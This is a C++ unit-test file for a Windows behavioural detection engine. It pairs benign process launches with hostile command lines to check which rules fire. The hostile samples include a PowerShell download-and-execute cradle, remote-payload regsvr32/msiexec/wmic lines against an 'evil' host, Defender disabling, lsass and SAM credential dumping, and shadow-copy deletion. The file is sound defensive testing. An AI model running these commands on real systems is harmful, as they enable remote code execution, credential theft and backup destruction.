#include <cstdlib>
#include <string>

#include <gtest/gtest.h>

#include "avbehavior/rule_engine.hpp"

namespace {

using avbehavior::ProcessEvent;
using avbehavior::RuleEngine;

bool HasRule(const std::vector<avcore::DetectionEvent>& detections, const std::string& rule_id) {
    for (const auto& d : detections) {
        if (d.rule_id == rule_id) return true;
    }
    return false;
}

// Returns the severity of the first detection matching rule_id, or Info if the
// rule did not fire. Info here doubles as "not detected" since no rule emits Info.
avcore::Severity SeverityOf(const std::vector<avcore::DetectionEvent>& detections,
                            const std::string& rule_id) {
    for (const auto& d : detections) {
        if (d.rule_id == rule_id) return d.severity;
    }
    return avcore::Severity::Info;
}

std::vector<avcore::DetectionEvent> RunPowerShell(RuleEngine& engine,
                                                  std::uint32_t pid,
                                                  const std::string& command_line) {
    ProcessEvent event;
    event.process_id = pid;
    event.parent_process_id = 1;
    event.image_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    event.command_line = command_line;
    return engine.OnProcessCreate(event);
}

std::string TempDir() {
    const char* temp = std::getenv("TEMP");
    return temp ? std::string(temp) : std::string("C:\\Users\\Default\\AppData\\Local\\Temp");
}

} // namespace

TEST(RuleEngineTest, FlagsLolbinCertutilDecode) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent event;
    event.process_id = 100;
    event.parent_process_id = 1;
    event.image_path = "C:\\Windows\\System32\\certutil.exe";
    event.command_line = "certutil.exe -decode payload.txt out.exe";

    const auto detections = engine.OnProcessCreate(event);
    EXPECT_TRUE(HasRule(detections, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(RuleEngineTest, DoesNotFlagBenignCertutilUsage) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent event;
    event.process_id = 101;
    event.parent_process_id = 1;
    event.image_path = "C:\\Windows\\System32\\certutil.exe";
    event.command_line = "certutil.exe -hashfile document.pdf SHA256";

    const auto detections = engine.OnProcessCreate(event);
    EXPECT_FALSE(HasRule(detections, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(RuleEngineTest, OfficeSpawningPowershellIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent office;
    office.process_id = 10;
    office.parent_process_id = 1;
    office.image_path = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
    engine.OnProcessCreate(office);

    ProcessEvent child;
    child.process_id = 11;
    child.parent_process_id = 10;
    child.image_path = "C:\\Windows\\System32\\powershell.exe";
    child.command_line = "powershell.exe -nop -enc SQBFAFgA...";

    const auto detections = engine.OnProcessCreate(child);
    bool found_malicious = false;
    for (const auto& d : detections) {
        if (d.rule_id == "BEH.OFFICE_SPAWNS_SHELL") {
            found_malicious = (d.severity == avcore::Severity::Malicious);
        }
    }
    EXPECT_TRUE(found_malicious);
}

TEST(RuleEngineTest, DoesNotFlagUnrelatedParentChild) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent explorer;
    explorer.process_id = 20;
    explorer.parent_process_id = 1;
    explorer.image_path = "C:\\Windows\\explorer.exe";
    engine.OnProcessCreate(explorer);

    ProcessEvent child;
    child.process_id = 21;
    child.parent_process_id = 20;
    child.image_path = "C:\\Windows\\System32\\powershell.exe";
    child.command_line = "powershell.exe -File C:\\scripts\\backup.ps1";

    const auto detections = engine.OnProcessCreate(child);
    EXPECT_FALSE(HasRule(detections, "BEH.OFFICE_SPAWNS_SHELL"));
}

TEST(RuleEngineTest, TempSpawnFlaggedWithoutKnownParent) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent event;
    event.process_id = 30;
    event.parent_process_id = 2; // not registered in the tree
    event.image_path = TempDir() + "\\dropper_payload.exe";

    const auto detections = engine.OnProcessCreate(event);
    EXPECT_TRUE(HasRule(detections, "BEH.TEMP_APPDATA_SPAWN"));
}

TEST(RuleEngineTest, TempSpawnAllowedForMsiexecParent) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent msiexec;
    msiexec.process_id = 40;
    msiexec.parent_process_id = 1;
    msiexec.image_path = "C:\\Windows\\System32\\msiexec.exe";
    engine.OnProcessCreate(msiexec);

    ProcessEvent installer_temp;
    installer_temp.process_id = 41;
    installer_temp.parent_process_id = 40;
    installer_temp.image_path = TempDir() + "\\{installer-guid}\\setup_helper.exe";

    const auto detections = engine.OnProcessCreate(installer_temp);
    EXPECT_FALSE(HasRule(detections, "BEH.TEMP_APPDATA_SPAWN"));
}

TEST(RuleEngineTest, UnsignedTempExecFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent event;
    event.process_id = 50;
    event.parent_process_id = 2;
    // File need not exist for this check -- IsAuthenticodeSigned simply fails
    // closed (treated as unsigned) for a missing/unverifiable file.
    event.image_path = TempDir() + "\\definitely_not_signed.exe";

    const auto detections = engine.OnProcessCreate(event);
    EXPECT_TRUE(HasRule(detections, "BEH.UNSIGNED_TEMP_EXEC"));
}

TEST(RuleEngineTest, SignedSystemBinaryNotFlaggedAsUnsigned) {
    RuleEngine engine = RuleEngine::WithDefaultRules();

    ProcessEvent event;
    event.process_id = 51;
    event.parent_process_id = 2;
    event.image_path = "C:\\Windows\\System32\\notepad.exe"; // not under a user-writable dir at all

    const auto detections = engine.OnProcessCreate(event);
    EXPECT_FALSE(HasRule(detections, "BEH.UNSIGNED_TEMP_EXEC"));
}

// ---------------------------------------------------------------------------
// PowerShell obfuscation rule: weighted multi-signal scoring. These tests pin
// down the false-positive reduction -- a single weak indicator that legitimate
// installers/CI use constantly must NOT alert, while real malicious cradles do.
// ---------------------------------------------------------------------------

TEST(PowerShellRuleTest, BenignExecutionPolicyBypassNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Classic Chocolatey/winget/installer invocation -- extremely common, benign.
    const auto d = RunPowerShell(engine, 200,
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-Service\"");
    EXPECT_FALSE(HasRule(d, "BEH.PS_OBFUSCATION"));
}

TEST(PowerShellRuleTest, BenignHiddenHeadlessScriptNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Scheduled-task style: hidden + noprofile + noninteractive, but all one
    // category (exec flags). Should stay below the noise floor.
    const auto d = RunPowerShell(engine, 201,
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -File C:\\scripts\\backup.ps1");
    EXPECT_FALSE(HasRule(d, "BEH.PS_OBFUSCATION"));
}

TEST(PowerShellRuleTest, BenignInvokeWebRequestNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // A lone Invoke-WebRequest (e.g. downloading an update) is a single medium
    // signal (score 2) -- below threshold, so no alert.
    const auto d = RunPowerShell(engine, 202,
        "powershell.exe -Command \"Invoke-WebRequest -Uri https://example.com/f.zip -OutFile f.zip\"");
    EXPECT_FALSE(HasRule(d, "BEH.PS_OBFUSCATION"));
}

TEST(PowerShellRuleTest, EncodedCommandIsAtLeastSuspicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // A base64 -EncodedCommand payload is a strong indicator on its own.
    const auto d = RunPowerShell(engine, 203,
        "powershell.exe -EncodedCommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AA==");
    EXPECT_NE(avcore::Severity::Info, SeverityOf(d, "BEH.PS_OBFUSCATION"));
}

TEST(PowerShellRuleTest, DownloadCradleWithIexIsFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Textbook fetch-and-run cradle: download cradle + dynamic execution.
    const auto d = RunPowerShell(engine, 204,
        "powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil/x')\"");
    EXPECT_NE(avcore::Severity::Info, SeverityOf(d, "BEH.PS_OBFUSCATION"));
}

TEST(PowerShellRuleTest, MultiSignalObfuscationIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Encoded payload + hidden window + AMSI bypass = overwhelming evidence.
    const auto d = RunPowerShell(engine, 205,
        "powershell.exe -nop -w hidden -enc AAAA -Command \"[Ref].Assembly.GetType('...AmsiUtils')\"");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.PS_OBFUSCATION"));
}

TEST(PowerShellRuleTest, NonPowerShellImageIgnored) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent event;
    event.process_id = 206;
    event.parent_process_id = 1;
    event.image_path = "C:\\Windows\\System32\\cmd.exe";
    event.command_line = "cmd.exe -EncodedCommand -ExecutionPolicy Bypass amsiutils virtualalloc";
    const auto d = engine.OnProcessCreate(event);
    EXPECT_FALSE(HasRule(d, "BEH.PS_OBFUSCATION"));
}

// ---------------------------------------------------------------------------
// LOLBin rule: severity tiering. Specific abuse techniques stay Malicious;
// dual-use patterns (silent MSI installs, wmic queries, bare tool launches)
// no longer produce Malicious false positives.
// ---------------------------------------------------------------------------

namespace {
std::vector<avcore::DetectionEvent> RunLolbin(RuleEngine& engine, std::uint32_t pid,
                                              const std::string& image, const std::string& cmd) {
    ProcessEvent e;
    e.process_id = pid;
    e.parent_process_id = 1;
    e.image_path = image;
    e.command_line = cmd;
    return engine.OnProcessCreate(e);
}
} // namespace

TEST(LolbinRuleTest, CertutilDecodeStaysMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunLolbin(engine, 300, "C:\\Windows\\System32\\certutil.exe",
                             "certutil.exe -decode payload.txt out.exe");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, Regsvr32SquiblydooStaysMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunLolbin(engine, 301, "C:\\Windows\\System32\\regsvr32.exe",
                             "regsvr32.exe /s /n /u /i:http://evil/x.sct scrobj.dll");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, SilentMsiInstallIsSuspiciousNotMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Enterprise/winget/SCCM silent install -- must not be a Malicious false positive.
    const auto d = RunLolbin(engine, 302, "C:\\Windows\\System32\\msiexec.exe",
                             "msiexec.exe /i app.msi /qn /norestart");
    EXPECT_EQ(avcore::Severity::Suspicious, SeverityOf(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, MsiexecRemoteInstallIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunLolbin(engine, 303, "C:\\Windows\\System32\\msiexec.exe",
                             "msiexec.exe /i https://evil/x.msi /qn");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, BareMakecabNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Previously fired Malicious on any launch due to an empty arg match.
    const auto d = RunLolbin(engine, 304, "C:\\Windows\\System32\\makecab.exe",
                             "makecab.exe /D CompressionType=LZX archive.cab source.dir");
    EXPECT_FALSE(HasRule(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, BareRegasmNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunLolbin(engine, 305, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe",
                             "regasm.exe /codebase MyLib.tlb");
    EXPECT_FALSE(HasRule(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, WmicFormatListNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // /format:list is an extremely common benign query format.
    const auto d = RunLolbin(engine, 306, "C:\\Windows\\System32\\wbem\\wmic.exe",
                             "wmic.exe process get name,processid /format:list");
    EXPECT_FALSE(HasRule(d, "BEH.LOLBIN_SUSP_ARGS"));
}

TEST(LolbinRuleTest, WmicRemoteXslIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunLolbin(engine, 307, "C:\\Windows\\System32\\wbem\\wmic.exe",
                             "wmic.exe os get /format:\"http://evil/x.xsl\"");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.LOLBIN_SUSP_ARGS"));
}

// ---------------------------------------------------------------------------
// Defense-evasion rule: fodhelper needs a suspicious parent (not bare launch),
// security-control tampering stays Malicious, dual-use tweaks are Suspicious.
// ---------------------------------------------------------------------------

TEST(DefenseEvasionRuleTest, FodhelperFromExplorerNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent explorer;
    explorer.process_id = 400;
    explorer.parent_process_id = 1;
    explorer.image_path = "C:\\Windows\\explorer.exe";
    engine.OnProcessCreate(explorer);

    ProcessEvent fod;
    fod.process_id = 401;
    fod.parent_process_id = 400;
    fod.image_path = "C:\\Windows\\System32\\fodhelper.exe";
    const auto d = engine.OnProcessCreate(fod);
    EXPECT_FALSE(HasRule(d, "BEH.DEFENSE_EVASION"));
}

TEST(DefenseEvasionRuleTest, FodhelperFromPowerShellIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent ps;
    ps.process_id = 402;
    ps.parent_process_id = 1;
    ps.image_path = "C:\\Windows\\System32\\powershell.exe";
    engine.OnProcessCreate(ps);

    ProcessEvent fod;
    fod.process_id = 403;
    fod.parent_process_id = 402;
    fod.image_path = "C:\\Windows\\System32\\fodhelper.exe";
    const auto d = engine.OnProcessCreate(fod);
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.DEFENSE_EVASION"));
}

TEST(DefenseEvasionRuleTest, DefenderDisableIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunPowerShell(engine, 404,
        "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.DEFENSE_EVASION"));
}

TEST(DefenseEvasionRuleTest, AttribReadOnlyRemovalIsSuspiciousNotMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent e;
    e.process_id = 405;
    e.parent_process_id = 1;
    e.image_path = "C:\\Windows\\System32\\attrib.exe";
    e.command_line = "attrib.exe -r C:\\build\\output.txt";
    const auto d = engine.OnProcessCreate(e);
    EXPECT_EQ(avcore::Severity::Suspicious, SeverityOf(d, "BEH.DEFENSE_EVASION"));
}

// ---------------------------------------------------------------------------
// Credential-access rule: referencing lsass is not the same as dumping it.
// ---------------------------------------------------------------------------

TEST(CredentialAccessRuleTest, GetProcessLsassNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Benign admin check -- references lsass but does not dump it.
    const auto d = RunPowerShell(engine, 500, "powershell.exe Get-Process lsass");
    EXPECT_FALSE(HasRule(d, "BEH.CREDENTIAL_ACCESS"));
}

TEST(CredentialAccessRuleTest, MimikatzSekurlsaIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunPowerShell(engine, 501,
        "powershell.exe Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'");
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.CREDENTIAL_ACCESS"));
}

TEST(CredentialAccessRuleTest, ProcdumpLsassIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent e;
    e.process_id = 502;
    e.parent_process_id = 1;
    e.image_path = "C:\\Tools\\procdump.exe";
    e.command_line = "procdump.exe -accepteula -ma lsass.exe lsass.dmp";
    const auto d = engine.OnProcessCreate(e);
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.CREDENTIAL_ACCESS"));
}

TEST(CredentialAccessRuleTest, RegSaveSamHiveIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent e;
    e.process_id = 503;
    e.parent_process_id = 1;
    e.image_path = "C:\\Windows\\System32\\reg.exe";
    e.command_line = "reg.exe save hklm\\sam C:\\temp\\sam.hive";
    const auto d = engine.OnProcessCreate(e);
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.CREDENTIAL_ACCESS"));
}

// ---------------------------------------------------------------------------
// Malware-behavior rules: file deletion is not ransomware; FOR /F is not
// obfuscation; but backup destruction still is.
// ---------------------------------------------------------------------------

TEST(MalwareBehaviorRuleTest, PlainRemoveItemNotRansomware) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Standard cleanup -- must not be flagged as ransomware.
    const auto d = RunPowerShell(engine, 600,
        "powershell.exe Remove-Item -Recurse -Force C:\\Users\\me\\AppData\\Local\\Temp\\build");
    EXPECT_FALSE(HasRule(d, "BEH.RANSOMWARE_FILE_OPS"));
}

TEST(MalwareBehaviorRuleTest, VssadminDeleteShadowsIsMalicious) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent e;
    e.process_id = 601;
    e.parent_process_id = 1;
    e.image_path = "C:\\Windows\\System32\\vssadmin.exe";
    e.command_line = "vssadmin.exe delete shadows /all /quiet";
    const auto d = engine.OnProcessCreate(e);
    EXPECT_EQ(avcore::Severity::Malicious, SeverityOf(d, "BEH.RANSOMWARE_FILE_OPS"));
}

TEST(MalwareBehaviorRuleTest, BatchForLoopNotObfuscation) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent e;
    e.process_id = 602;
    e.parent_process_id = 1;
    e.image_path = "C:\\Windows\\System32\\cmd.exe";
    e.command_line = "cmd.exe /c for /f \"tokens=1,2\" %%a in (list.txt) do echo %%a";
    const auto d = engine.OnProcessCreate(e);
    EXPECT_FALSE(HasRule(d, "BEH.COMMAND_OBFUSCATION"));
}

// ---------------------------------------------------------------------------
// WMI rule: read-only queries are benign; method invocation / persistence fire.
// ---------------------------------------------------------------------------

TEST(WmiRuleTest, GetWmiObjectQueryNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    // Ubiquitous inventory query -- must not alert.
    const auto d = RunPowerShell(engine, 603,
        "powershell.exe Get-WmiObject Win32_OperatingSystem");
    EXPECT_FALSE(HasRule(d, "BEH.WMI_EXECUTION"));
}

TEST(WmiRuleTest, InvokeWmiMethodIsFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    const auto d = RunPowerShell(engine, 604,
        "powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList calc.exe");
    EXPECT_NE(avcore::Severity::Info, SeverityOf(d, "BEH.WMI_EXECUTION"));
}

TEST(WmiRuleTest, WmicFormatListNotFlagged) {
    RuleEngine engine = RuleEngine::WithDefaultRules();
    ProcessEvent e;
    e.process_id = 605;
    e.parent_process_id = 1;
    e.image_path = "C:\\Windows\\System32\\wbem\\wmic.exe";
    e.command_line = "wmic.exe process list /format:list";
    const auto d = engine.OnProcessCreate(e);
    EXPECT_FALSE(HasRule(d, "BEH.WMI_EXECUTION"));
}
